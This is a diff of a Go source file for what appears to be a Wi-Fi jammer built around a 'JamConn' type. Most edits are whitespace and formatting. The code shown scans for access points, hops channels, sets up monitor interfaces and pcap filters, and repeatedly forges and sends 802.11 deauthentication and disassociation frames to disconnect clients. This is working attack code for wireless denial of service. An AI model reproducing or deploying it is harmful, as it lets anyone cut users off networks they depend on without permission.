@@ -27,25 +27,27 @@ type JamConn		struct {
 	handle			*pcap.Handle
 }
 
-func (conn *JamConn) SetLastDeauth(lastDeauth time.Time) {
+func	(conn *JamConn)	SetLastDeauth(lastDeauth time.Time) {
+
 	conn.lastDeauth = lastDeauth
 }
 
-func (conn *JamConn) SetLastAPScan(lastAPScan time.Time) {
+func	(conn *JamConn)	SetLastAPScan(lastAPScan time.Time) {
+
 	conn.lastAPScan = lastAPScan
 }
 
-func (conn *JamConn) SetLastChanSwitch(lastChanSwitch time.Time) {
+func	(conn *JamConn)	SetLastChanSwitch(lastChanSwitch time.Time) {
 
 	conn.lastChanSwitch = lastChanSwitch
 }
 
-func _NewJamConn(nlconn *genetlink.Conn, ifa *net.Interface, fam *genetlink.Family) *JamConn {
+func	_NewJamConn(nlconn *genetlink.Conn, ifa *net.Interface, fam *genetlink.Family) *JamConn {
 
 	return &JamConn{nlconn: nlconn, ifa: ifa, fam: fam}
 }
 
-func NewJamConn(ifaName string) (*JamConn, error) {
+func	NewJamConn(ifaName string) (*JamConn, error) {
 
 	nlconn, err := genetlink.Dial(nil)
 	if err != nil {
@@ -62,9 +64,9 @@ func NewJamConn(ifaName string) (*JamConn, error) {
 	return _NewJamConn(nlconn, &ifa, fam), nil
 }
 
-func (conn *JamConn) SetDeviceChannel(c int) error {
+func	(conn *JamConn)	SetDeviceChannel(c int) error {
 
-	if c < 1 || c > 14 {
+	if c < 1 || c > len(ChanArrG) {
 		return errors.New("invalid channel")
 	}
 	chann := ChanArrG[c - 1]
@@ -96,7 +98,7 @@ func (conn *JamConn) SetDeviceChannel(c int) error {
 	return nil
 }
 
-func (conn *JamConn) SetDeviceFreq(freq layers.RadioTapChannelFrequency) error {
+func	(conn *JamConn)	SetDeviceFreq(freq layers.RadioTapChannelFrequency) error {
 
 	chann, ok := ChanMapG[uint16(freq)]
 	if !ok {
@@ -131,7 +133,7 @@ func (conn *JamConn) SetDeviceFreq(freq layers.RadioTapChannelFrequency) error {
 }
 
 
-func (conn *JamConn) SendScanAbort() error {
+func	(conn *JamConn)	SendScanAbort() error {
 
 	encoder := netlink.NewAttributeEncoder()
 	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
@@ -160,7 +162,7 @@ func (conn *JamConn) SendScanAbort() error {
 	return nil
 }
 
-func (conn *JamConn) GetScanResults() ([]Ap, error) {
+func	(conn *JamConn)	GetScanResults() ([]Ap, error) {
 
 	encoder := netlink.NewAttributeEncoder()
 	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsDump
@@ -183,19 +185,10 @@ func (conn *JamConn) GetScanResults() ([]Ap, error) {
 	return decodeScanResults(msgs)
 }
 
-func (conn *JamConn) SetFilterForTargets() error {
+func	(conn *JamConn)	SetFilterForTargets() error {
 
-	var bpfExpr string
-	//var i = 0
-	//var ln = len(targetList) - 1
+	var bpfExpr	string
 
-	//for _, v := range targetList {
-	//	bpfExpr = bpfExpr + fmt.Sprintf("ether host %s", v.hwaddr.String())
-	//	if i < ln {
-	//		i++
-	//		bpfExpr = bpfExpr + " or "
-	//	}
-	//}
 	bpfExpr = fmt.Sprintf("wlan type data and not ether host %s and not ether host %s", conn.ifa.HardwareAddr.String(), BroadcastAddr)
 	if err := conn.handle.SetBPFFilter(bpfExpr); err != nil {
 		return errors.New("pcap.Handle.SetPBFFilter() " + err.Error())
@@ -203,7 +196,7 @@ func (conn *JamConn) SetFilterForTargets() error {
 	return nil
 }
 
-func (conn *JamConn) SetupPcapHandle() error {
+func	(conn *JamConn)	SetupPcapHandle() error {
 
 	inactive, err := pcap.NewInactiveHandle(conn.ifa.Name)
 	defer inactive.CleanUp()
@@ -233,7 +226,7 @@ func (conn *JamConn) SetupPcapHandle() error {
 }
 
 /* Playing around with making and removing virtual interfaces */
-func (conn *JamConn) MakeMonIfa() error {
+func	(conn *JamConn)	MakeMonIfa() error {
 
 	encoder := netlink.NewAttributeEncoder()
 	encoder.Uint32(nl80211.ATTR_IFTYPE, nl80211.IFTYPE_MONITOR)
@@ -258,7 +251,7 @@ func (conn *JamConn) MakeMonIfa() error {
 	return nil
 }
 
-func (conn *JamConn) DelMonIfa() error {
+func	(conn *JamConn)	DelMonIfa() error {
 
 	encoder := netlink.NewAttributeEncoder()
 	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
@@ -281,7 +274,7 @@ func (conn *JamConn) DelMonIfa() error {
 	return nil
 }
 
-func (conn *JamConn) SetIfaType(ifaType uint32) error {
+func	(conn *JamConn)	SetIfaType(ifaType uint32) error {
 
 	encoder := netlink.NewAttributeEncoder()
 	encoder.Uint32(nl80211.ATTR_IFTYPE, ifaType)
@@ -305,7 +298,7 @@ func (conn *JamConn) SetIfaType(ifaType uint32) error {
 	return nil
 }
 
-func (conn *JamConn) DoAPScan(whiteList *List, aps *List) (err error) {
+func	(conn *JamConn)	DoAPScan(whiteList *List, aps *List) (err error) {
 
 	if err := conn.SetIfaType(nl80211.IFTYPE_STATION); err != nil {
 		return errors.New("JamConn.SetIfaType() " + err.Error())
@@ -343,7 +336,7 @@ func (conn *JamConn) DoAPScan(whiteList *List, aps *List) (err error) {
 	return nil
 }
 
-func (conn *JamConn) ChangeChanIfPast(timeout time.Duration) {
+func	(conn *JamConn)	ChangeChanIfPast(timeout time.Duration) {
 
 	if time.Since(conn.lastChanSwitch) > timeout {
 		inx := randInt(1, len(ChanArrG))
@@ -352,7 +345,7 @@ func (conn *JamConn) ChangeChanIfPast(timeout time.Duration) {
 	}
 }
 
-func (conn *JamConn) DoAPScanIfPast(timeout time.Duration, whiteList *List, aps *List) {
+func	(conn *JamConn)	DoAPScanIfPast(timeout time.Duration, whiteList *List, aps *List) {
 
 	if time.Since(conn.lastAPScan) > timeout {
 		if err := conn.DoAPScan(whiteList, aps); err != nil {
@@ -361,7 +354,7 @@ func (conn *JamConn) DoAPScanIfPast(timeout time.Duration, whiteList *List, aps 
 	}
 }
 
-func (conn *JamConn) DeauthClientsIfPast(timeout time.Duration, count uint16, apList *List) {
+func	(conn *JamConn)	DeauthClientsIfPast(timeout time.Duration, count uint16, apList *List) {
 
 	if time.Since(conn.lastDeauth) > timeout {
 		for _, v := range apList.contents {
@@ -381,14 +374,15 @@ func (conn *JamConn) DeauthClientsIfPast(timeout time.Duration, count uint16, ap
 		conn.lastDeauth = time.Now()
 	}
 }
-func randInt(min int, max int) int {
+func	randInt(min int, max int) int {
 
 	return min + rand.Intn(max-min)
 }
 
-func createDot11Header(msgType layers.Dot11Type,
-		src net.HardwareAddr,dst net.HardwareAddr,
-		seq uint16, duration uint16) layers.Dot11 {
+func	createDot11Header(msgType layers.Dot11Type,
+			src net.HardwareAddr,dst net.HardwareAddr,
+			seq uint16, duration uint16) layers.Dot11 {
+
 	return layers.Dot11{
 		Type: msgType,
 		Proto: 0,
@@ -407,10 +401,14 @@ func createDot11Header(msgType layers.Dot11Type,
 	}
 }
 
-func (conn *JamConn) Deauthenticate(count uint16, reason layers.Dot11Reason, src net.HardwareAddr, dst net.HardwareAddr, tap *layers.RadioTap, dot11Orig *layers.Dot11) error {
+func	(conn *JamConn)	Deauthenticate(
+			count uint16, reason layers.Dot11Reason,
+			src net.HardwareAddr, dst net.HardwareAddr,
+			tap *layers.RadioTap, dot11Orig *layers.Dot11) error {
 
-	var i uint16
-	var opts gopacket.SerializeOptions
+	var i		uint16
+	var opts	gopacket.SerializeOptions
+	var buff	gopacket.SerializeBuffer
 
 	if tap.ChannelFrequency != 0 {
 		if err := conn.SetDeviceFreq(tap.ChannelFrequency); err != nil {
@@ -422,9 +420,6 @@ func (conn *JamConn) Deauthenticate(count uint16, reason layers.Dot11Reason, src
 
 	fmt.Printf("sending %d deauth frames from src %s - to %s\n", count, src.String(), dst.String())
 	for i = 1; i <= count; i++ {
-
-		var buff gopacket.SerializeBuffer
-
 		buff = gopacket.NewSerializeBuffer()
 		dot11 := createDot11Header(layers.Dot11TypeMgmtDeauthentication, src, dst,
 			dot11Orig.DurationID, dot11Orig.SequenceNumber + i)
@@ -446,10 +441,12 @@ func (conn *JamConn) Deauthenticate(count uint16, reason layers.Dot11Reason, src
 	return nil
 }
 
-func (conn *JamConn) Disassociate(src net.HardwareAddr, dst net.HardwareAddr, tap *layers.RadioTap, dot11Orig *layers.Dot11) error {
+func	(conn *JamConn)	Disassociate(
+			src net.HardwareAddr, dst net.HardwareAddr,
+			tap *layers.RadioTap, dot11Orig *layers.Dot11) error {
 
-	var buff gopacket.SerializeBuffer
-	var opts gopacket.SerializeOptions
+	var buff	gopacket.SerializeBuffer
+	var opts	gopacket.SerializeOptions
 
 	if err := conn.SetDeviceFreq(tap.ChannelFrequency); err != nil {
 		fmt.Println(err)
@@ -477,7 +474,7 @@ func (conn *JamConn) Disassociate(src net.HardwareAddr, dst net.HardwareAddr, ta
 }
 
 
-func (conn* JamConn) TriggerScan() (bool, error) {
+func	(conn* JamConn)	TriggerScan() (bool, error) {
 
 	encoder := netlink.NewAttributeEncoder()
 	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
